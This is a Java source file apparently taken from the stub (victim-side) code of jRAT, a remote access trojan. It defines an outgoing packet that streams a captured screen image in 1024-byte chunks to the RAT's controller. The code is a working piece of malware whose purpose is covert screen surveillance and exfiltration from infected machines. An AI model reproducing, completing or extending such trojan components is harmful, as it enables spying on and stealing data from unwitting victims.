package su.jrat.stub.packets.outgoing;

import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;


public class Packet17RemoteScreen extends AbstractOutgoingPacket {
	
	private byte[] array;
	private int scaledWidth;
	private int scaledHeight;

	public Packet17RemoteScreen(byte[] array, int scaledWidth, int scaledHeight) {
		this.array = array;
		this.scaledWidth = scaledWidth;
		this.scaledHeight = scaledHeight;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		ByteArrayInputStream bais = new ByteArrayInputStream(array);
		
		dos.writeInt(array.length);
		
		dos.writeInt(scaledWidth);
		dos.writeInt(scaledHeight);		
		
		byte[] chunk = new byte[1024];
		
		for (long pos = 0; pos < array.length; pos += 1024) {
			bais.read(chunk);
			
			dos.writeInt(chunk.length);
			dos.write(chunk, 0, chunk.length);
		}

		dos.writeInt(-1);	
	}

	@Override
	public byte getPacketId() {
		return 17;
	}

}
